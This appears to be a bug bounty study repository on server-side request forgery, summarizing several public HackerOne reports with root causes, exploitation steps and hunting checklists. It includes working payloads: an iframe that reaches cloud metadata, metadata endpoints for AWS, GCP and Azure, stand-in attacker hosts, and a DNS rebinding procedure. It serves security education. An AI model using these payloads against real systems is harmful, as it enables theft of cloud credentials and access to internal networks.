# 🛡️ Server-Side Request Forgery (SSRF)

> A collection of SSRF vulnerability research notes, attack patterns, bypass techniques, and lessons learned from public bug bounty reports.

---

## 📚 Topics Covered

| Category | Description |
|---|---|
| 🌐 Basic SSRF | Understanding server-side requests controlled by attackers |
| 🔗 URL Manipulation | SSRF through user-controlled URLs and parameters |
| 🪝 Webhooks | SSRF through callback and webhook functionality |
| 📥 File Fetching | SSRF through image, document, and resource imports |
| 🔄 Redirect Abuse | Using redirects to bypass SSRF protections |
| 🕵️ Blind SSRF | Detecting SSRF without seeing the response |
| ☁️ Cloud Metadata | Accessing cloud metadata services through SSRF |
| 🔀 Filter Bypass | Bypassing SSRF protections and URL validation |
| 🌍 Internal Services | Accessing internal networks and services |
| 📡 Detection Methods | Burp Collaborator, Interactsh, DNS and HTTP callbacks |
| 🔐 Impact Analysis | Internal access, data exposure, and privilege escalation |

---
<details>
  <summary><b>where to look for SSRF </b></summary>
  # 🔍 Where to Find SSRF

Any feature where the server fetches something on your behalf.

## 🌐 URL Fetching / Previews
```
url, uri, source, link, endpoint, callback, target
```
Link previews, screenshot tools, redirect checkers.

## 🪝 Webhooks
```
webhook_url, callback_url, notify_url
```
Whole feature = server making outbound requests. High-value.

## 📥 File / Resource Import
```
file_url, image_url, import_url, remote_url, attachment_url
```
Avatar fetch, project import, "load from URL."

## 📄 Document/Media Rendering
PDF generation, screenshots, email previews. No `url=` needed — inject `<iframe>`/`<img>` into rendered HTML.

## 🔗 Integrations
```
host, server, api_url, base_url, proxy
```
"Test connection" buttons, custom endpoint configs.

## 🧩 Easy to Miss
- SVG/XML uploads → XXE-driven SSRF
- OAuth: `redirect_uri`, `metadata_url`
- Markdown/embed rendering
- Hostname (not IP) params → DNS rebinding

## Ask
"Can I make the server request a URL I control?" → Confirm with Collaborator/Interactsh → push to internal IPs + cloud metadata.
</details>
<details>
  <summary>quick info !!</summary>
  # 🔎 SSRF Verification

To confirm SSRF, make the server request a URL you control.

Example:

```
Input:
url=https://your-id.interactsh.com
```

If you receive:

```
DNS interaction
HTTP request
```

then:

```
Target Server ---> Your Server
```

is confirmed.

After confirming SSRF, test internal targets:

```
127.0.0.1
localhost
169.254.169.254 (cloud metadata)
```

Main idea:

"Can I make the server send a request for me?"
</details>

# 📝 Vulnerability Notes

---

<details>
<summary><b>🔴 SSRF Leading to Cloud Metadata Access and Remote Code Execution</b></summary>

<br>

**Source:** [HackerOne Report #341876](https://hackerone.com/reports/341876)

---

## 🐞 Vulnerability

A screenshot generation feature allowed users to provide content that was processed by the server.

The server generated screenshots by visiting URLs controlled by the user.

Because the backend could make HTTP requests internally, an attacker could force the server to request internal services.

This resulted in a Server-Side Request Forgery (SSRF) vulnerability.

---

## 🔍 Root Cause

The application trusted user-controlled URLs and allowed the backend to access arbitrary destinations.

The server could communicate with internal resources that should not have been accessible externally.

Normal flow:

```
User URL
  |
  v
Screenshot Service
  |
  v
Public Website
```

Attack flow:

```
Attacker URL
  |
  v
Screenshot Service
  |
  v
Internal Services
```

The application failed to restrict access to:

- Internal IP addresses
- Cloud metadata services
- Private infrastructure

---

## ⚔️ Exploitation

1. Find a feature where the server fetches or processes a URL.

Examples:

- Screenshot generators
- URL previews
- Image fetchers
- Webhooks
- Import features

2. Replace the URL with an internal destination.

Example:

```
http://metadata.google.internal/
```

3. The server sends the request internally.

4. Retrieve sensitive information returned by the internal service.

---

## 🔗 Attack Chain

The SSRF vulnerability allowed access to cloud metadata services.

```
SSRF
  |
  v
Cloud Metadata Service
  |
  v
Cloud Credentials / Secrets
  |
  v
Kubernetes Credentials
  |
  v
Container Access
  |
  v
Remote Code Execution
```

The attacker accessed cloud metadata, retrieved Kubernetes credentials, and eventually gained root access inside containers.

---

## 🎯 Impact

Possible impacts:

- Access internal services
- Read cloud metadata
- Steal temporary credentials
- Access private APIs
- Retrieve secrets
- Reach internal infrastructure
- Achieve Remote Code Execution

---

## 🎯 Hunting Strategy

Look for features that make the server send requests.

Common parameters:

```
url
uri
link
image
source
callback
webhook
redirect
proxy
fetch
import
```

Test destinations:

```
localhost
127.0.0.1
Internal hostnames
Private IP ranges
Cloud metadata endpoints
```

Cloud metadata examples:

AWS:
```
http://169.254.169.254/
```

Google Cloud:
```
http://metadata.google.internal/
```

Azure:
```
http://169.254.169.254/metadata/
```

Main question:

"Can I make the server request something that I cannot access directly?"

</details>

---

<details>
<summary><b>🔴 Server-Side Request Forgery (SSRF) Through HTML Template Injection Leading to AWS Credential Exposure</b></summary>

<br>

**Source:** [HackerOne Report #2262382](https://hackerone.com/reports/2262382)

---

## 🐞 Vulnerability

A Server-Side Request Forgery (SSRF) vulnerability existed in the analytics report generation feature.

The application allowed users to control the content of a `template` field that was later rendered into HTML and converted into a PDF.

Because the HTML renderer processed attacker-controlled content on the server side, an attacker could inject external requests using HTML elements such as:

```html
<iframe src="http://169.254.169.254/latest/meta-data/">
</iframe>
```

When generating the PDF, the server-side renderer automatically requested the provided URL.
This allowed an attacker to make internal requests from the application's server.

---

## 🔍 Root Cause

The application trusted user-controlled template data and inserted it into HTML without proper sanitization.

The vulnerable flow:

```
User Input
    |
    v
template field
    |
    v
HTML generation
    |
    v
PDF renderer
    |
    v
Server makes request
```

The application expected:

```
template = predefined_report_section
```

but accepted:

```
template = attacker-controlled HTML
```

The PDF generation library processed the injected HTML and performed requests from the backend server.

---

## ⚔️ Exploitation

1. Find a feature that generates server-side content:

- PDF reports
- Screenshots
- Documents
- Email previews

2. Identify user-controlled template or HTML fields.

3. Inject HTML that forces the server to request another URL.

Example:

```html
<iframe src="http://169.254.169.254/latest/meta-data/">
</iframe>
```

4. Generate the report/PDF.

5. Observe the response or generated file.

6. Access internal services through the server.

In cloud environments, test metadata services:

```
AWS:
http://169.254.169.254/latest/meta-data/

GCP:
http://metadata.google.internal/

Azure:
http://169.254.169.254/metadata/
```

---

## 🎯 Impact

The SSRF allowed attackers to access internal resources from the application server.

Possible impacts:

- Access internal services
- Read internal files
- Bypass network restrictions
- Retrieve cloud metadata
- Obtain temporary cloud credentials
- Access cloud resources depending on permissions

In this report, the attacker was able to retrieve AWS credentials from the metadata service.

---

## 🎯 Hunting Strategy

Look for features that make the server fetch or process external content:

- PDF generation
- Screenshot generation
- URL previews
- Image processing
- Webhooks
- Import from URL
- Document conversion
- External integrations

Look for parameters:

```
url
uri
path
template
source
image
file
callback
redirect
endpoint
webhook
```

Test:

```
http://127.0.0.1
http://localhost
http://169.254.169.254
http://metadata.google.internal
internal hostnames
private IP ranges
```

Main question:

"Can I make the server send a request somewhere that I cannot access directly?"

</details>

---

<details>
  <summary><b>🟠 SSRF through Project Import using Remote Attachment URL</b></summary>
**Source:** [HackerOne Report #826361](https://hackerone.com/reports/826361)

---

## 🐞 Vulnerability

A Server-Side Request Forgery (SSRF) vulnerability existed in GitLab's project import functionality.

GitLab allowed users to import projects using an exported project archive.

During the import process, GitLab processed attachment fields using the CarrierWave uploader.

One of these fields:

```
remote_attachment_url
```

allowed an attacker to provide a URL.

When the project was imported, GitLab's backend server automatically downloaded the file from the provided URL.

Because this request was performed server-side, an attacker could force GitLab to send requests to internal services.

Normal flow:

```
User imports project
  |
  v
GitLab Import Handler
  |
  v
Download attachment from external URL
```

Attack flow:

```
Attacker-controlled URL
  |
  v
GitLab Server
  |
  v
Internal Services
```

This resulted in an SSRF vulnerability.

---

## 🔍 Root Cause

The root cause was that GitLab trusted user-controlled URLs during project imports.

The import process failed to remove dangerous attributes before creating objects.

The vulnerable flow:

```
Project Export File
  |
  v
remote_attachment_url
  |
  v
CarrierWave Downloader
  |
  v
Server-side HTTP Request
```

The application expected:

```
attachment = uploaded file
```

but accepted:

```
attachment = URL controlled by attacker
```

The backend downloaded the URL directly without restricting the destination.

This allowed requests to:

- Internal IP addresses
- Local services
- Cloud metadata endpoints

---

## ⚔️ Exploitation

1. Create a GitLab project.

2. Create an issue and add a note.

3. Export the project.

4. Extract the project archive.

5. Modify the exported data and add:

```
remote_attachment_url=https://attacker-server.com/file
```

6. Recompress the archive.

7. Import the modified project.

8. GitLab server requests the attacker-controlled URL.

After confirming SSRF, test internal resources:

```
http://127.0.0.1
http://localhost
http://169.254.169.254
```

Example cloud metadata targets:

AWS:
```
http://169.254.169.254/latest/meta-data/
```

Google Cloud:
```
http://metadata.google.internal/
```

Azure:
```
http://169.254.169.254/metadata/
```

---

## 🔗 Attack Chain

The SSRF vulnerability could be chained with internal services.

```
SSRF
  |
  v
Internal Network Access
  |
  v
Cloud Metadata Service
  |
  v
Temporary Credentials
  |
  v
Cloud Resource Access
```

Other possible chains:

```
SSRF
  |
  v
Internal Admin Panels
  |
  v
Sensitive Data Exposure
```

or:

```
SSRF
  |
  v
Internal Redis / Services
  |
  v
Possible Remote Code Execution
```

---

## 🎯 Impact

The vulnerability allowed attackers to:

- Access internal services from GitLab servers
- Bypass external network restrictions
- Read cloud metadata
- Retrieve cloud credentials
- Discover internal infrastructure
- Access monitoring services
- Potentially chain SSRF into further compromise

In cloud environments, SSRF could expose:

- AWS credentials
- Service account tokens
- Internal API endpoints
- Private infrastructure information

---

## 🎯 Hunting Strategy

Look for features where the server downloads or processes external resources:

- Project imports
- File imports
- Image uploads from URL
- Avatar fetching
- Document processing
- URL previews
- Webhooks
- Screenshot generation
- PDF generation
- External integrations

Common parameters:

```
url
uri
remote_url
file_url
image_url
attachment_url
source
import_url
callback
webhook
fetch
proxy
```

Test with:

```
https://your-collaborator-domain.com
```

Confirm:

```
DNS interaction
HTTP request
```

Then test internal destinations:

```
localhost
127.0.0.1
Internal hostnames
Private IP ranges
169.254.169.254
```

Main question:

"Can I make the server download something on my behalf?"

---
Import feature + user-controlled URL + backend download = SSRF.
</details>

---

<details>
<summary><b>🟡 SSRF in GraphQL `source` Parameter</b></summary>

<br>

**Source:** [HackerOne Report #1864188](https://hackerone.com/reports/1864188)

---

## 🐞 Vulnerability

A GraphQL query allowed users to control the `source` parameter.

The backend used this parameter to perform HTTP GET requests.

Because the URL was fully controlled by the user, an attacker could force the server to send requests to arbitrary destinations.

The vulnerable GraphQL query:

```
allTicks
```

contained a user-controlled parameter:

```
source
```

The application expected a predefined source, but accepted any URL.

Example:

```graphql
query {
  allTicks(
    symbol:"TSLA",
    source:"https://attacker.com/"
  )
}
```

The backend requested the attacker-controlled URL, causing an SSRF vulnerability.

---

## 🔍 Root Cause

The application trusted user-controlled URLs without validation.

Normal flow:

```
GraphQL Query
      |
      v
source parameter
      |
      v
Backend Request
      |
      v
Trusted Source
```

Attack flow:

```
Attacker URL
      |
      v
source parameter
      |
      v
Backend Request
      |
      v
External/Internal Service
```

---

## ⚔️ Exploitation

1. Find GraphQL queries containing URL parameters.

Examples:

```
source
url
endpoint
callback
```

2. Replace the URL with Burp Collaborator or Interactsh:

```
https://xxxxx.burpcollaborator.net
```

3. Execute the GraphQL query.

4. Confirm SSRF through:

```
DNS interaction
HTTP request
```

5. Test internal resources:

```
127.0.0.1
localhost
169.254.169.254
```

---

## 🎯 Impact

Possible impacts:

- Blind SSRF
- Internal service discovery
- Access to internal APIs
- Cloud metadata access
- Potential credential exposure

---

## 🎯 Hunting Strategy

Look for:

- GraphQL fields accepting URLs
- Webhooks
- Import features
- URL previews
- External integrations

Common parameters:

```
source
url
uri
endpoint
callback
webhook
fetch
proxy
```

Main question:

"Can I make the server send a request somewhere that I cannot access directly?"

</details>

---

<details>
<summary><b>🟠 Blind SSRF to Internal Services in Matrix `preview_url` API</b></summary>

<br>

**Source:** [HackerOne Report #1960765](https://hackerone.com/reports/1960765)

---

## 🐞 Vulnerability

Reddit's chat feature is built on Matrix, which includes a link-preview endpoint used to generate rich previews for shared URLs.

The endpoint:

```
https://matrix.redditspace.com/_matrix/media/r0/preview_url/?url=*
```

did not filter or restrict the `url` parameter before the server used it to fetch content.

Because this request was made server-side, an attacker could point `url` at internal services instead of public websites.

Example:

```
https://matrix.redditspace.com/_matrix/media/r0/preview_url/?url=http://internal-host/
```

The response returned metadata (such as `og:title`) scraped from whatever the server fetched — meaning the SSRF was "partially blind": no raw response body was returned, but enough was leaked to fingerprint internal services.

---

## 🔍 Root Cause

The application trusted the `url` parameter completely and allowed the backend to fetch it, without distinguishing between public destinations and internal/private network ranges.

Normal flow:

```
User shares a link
      |
      v
preview_url endpoint
      |
      v
Server fetches URL
      |
      v
Public website metadata returned
```

Attack flow:

```
Attacker-supplied internal URL
      |
      v
preview_url endpoint
      |
      v
Server fetches internal service
      |
      v
og:title / metadata leaked
```

The endpoint had no allow-list or internal-IP filtering in place.

---

## ⚔️ Exploitation

1. Find a link-preview / unfurl feature that fetches user-supplied URLs server-side.

2. Replace the URL with internal hosts or IPs:

```
https://matrix.redditspace.com/_matrix/media/r0/preview_url/?url=http://internal-host/
```

3. Read back the `og:title` or other metadata extracted from the response — this confirms the request reached an internal service, even without seeing the full response body.

4. Repeat against different internal hosts to enumerate reachable services (light, non-destructive scanning — confirmed with the program before proceeding further).

5. If a slow/hanging request is returned, reload and retry rather than assuming failure — internal services may respond inconsistently.

6. Look for follow-on impact: since only GET requests were possible, escalation was limited to services that perform state changes on GET (a common but risky anti-pattern) — this required explicit permission from the program before testing.

---

## 🎯 Impact

Possible impacts:

- Internal service enumeration via leaked metadata (titles, service names)
- Effective port scanning of internal infrastructure
- Fingerprinting of internal panels/services otherwise unreachable externally
- Potential escalation to RCE *if* any reachable internal service performed unsafe actions on GET requests (scoped and explicitly authorized in this case)

Because responses weren't fully blind — some data (like `og:title`) was reflected back — the impact was rated higher than a purely blind SSRF, and the report was rewarded as **High** with a $5,000 bounty plus a $1,000 bonus.

---

## 🎯 Hunting Strategy

Look for features that unfurl or preview links server-side:

- Chat/messaging link previews
- URL unfurling APIs
- Social/embed card generators
- Any endpoint with a `url=` or `link=` parameter that returns scraped metadata

Common parameters:

```
url
link
preview_url
source
```

Test destinations:

```
internal hostnames
internal IP ranges
localhost
127.0.0.1
```

Main question:

"Can I make the server fetch something internal — and does any part of the response leak back to me?"

</details>

---

<details>
<summary><b>🟠 SSRF via DNS Rebinding — Webhook URL Validation Bypass</b></summary>

<br>

**Source:** [HackerOne Report #632101](https://hackerone.com/reports/632101)

---

## 🐞 Vulnerability

GitLab's webhook feature validated URLs before sending requests, to block SSRF against the internal network.

The validation function performed a DNS lookup, checked if the resolved IP belonged to the local network, and rejected it if so — then reused that resolved IP for the actual request to prevent the domain resolving to something different later (DNS rebinding protection).

The flaw: if the DNS lookup **failed to resolve** during validation (e.g. domain didn't resolve yet), the rebinding protection was skipped entirely — and the request proceeded anyway once the domain *did* resolve, by then to an internal IP.

```
lib/gitlab/url_blocker.rb (validate function)
```

---

## 🔍 Root Cause

The validator only enforced its internal-IP check on the *success* path of DNS resolution. An error/no-resolution path had no equivalent safeguard.

Normal flow:

```
Webhook URL
      |
      v
DNS Lookup
      |
      v
IP is internal? ---> reject
      |
      v
IP is external ---> allow + pin IP
```

Attack flow (DNS rebinding):

```
Webhook URL (first lookup fails / times out)
      |
      v
Validation skipped (no IP to check)
      |
      v
Webhook fires later
      |
      v
Domain now resolves to 169.254.169.254 / 127.0.0.1
      |
      v
Request sent to internal target
```

By controlling a DNS server that first returns no/failing records, then later returns an internal IP via a chain of CNAMEs (to defeat caching), the check could be bypassed entirely.

---

## ⚔️ Exploitation

1. Set up a domain (`hacker1.xyz`) on an attacker-controlled DNS server that can return different records per query, using CNAME chaining to avoid DNS caching.

2. Create a webhook on a GitLab repository pointing to that domain:

```
http://990.hacker1.xyz
```

3. Trigger the webhook once — the initial DNS lookup fails/errors, so GitLab's validator skips the internal-IP check.

4. Wait ~10 seconds, then fire the webhook test ("Test" → "Push events").

5. By this point the domain resolves to an internal target:

```
http://169.254.169.254
http://127.0.0.1
```

6. The webhook response returns the content fetched from the internal target.

7. Space out retries by ~15 seconds to avoid DNS caching interfering with the rebind.

---

## 🎯 Impact

- Bypassed SSRF/DNS-rebinding protections entirely via a race between validation and execution
- Confirmed access to `169.254.169.254` (cloud metadata range) and `127.0.0.1`
- Chained impact referenced a prior public GitLab SSRF report (#341876, $25,000 bounty) where the same metadata-endpoint access path led to Google Cloud RCE — though GitLab's own triage noted the metadata endpoint wasn't reachable on gitlab.com's specific setup, lowering severity from Critical to High

---

## 🛠️ Fix

Patched in GitLab 12.1.2 — the validator was updated to enforce the internal-IP check regardless of whether the initial DNS lookup succeeded or failed, closing the race window.

---

## 🎯 Hunting Strategy

When an app claims to block SSRF via IP/domain validation, don't just test the happy path — test the **failure and timing paths**:

- What happens if the domain doesn't resolve on first check?
- Is the validated IP the same IP actually used for the request, or could it change between check and use (TOCTOU)?
- Can you control a DNS server to return different answers on sequential queries (rebinding)?
- Use short TTLs / CNAME chains to defeat resolver caching during the attack window.

Main question:

"Even if this app blocks internal IPs today — can I make the answer change *after* it checks, but *before* it connects?"

</details>
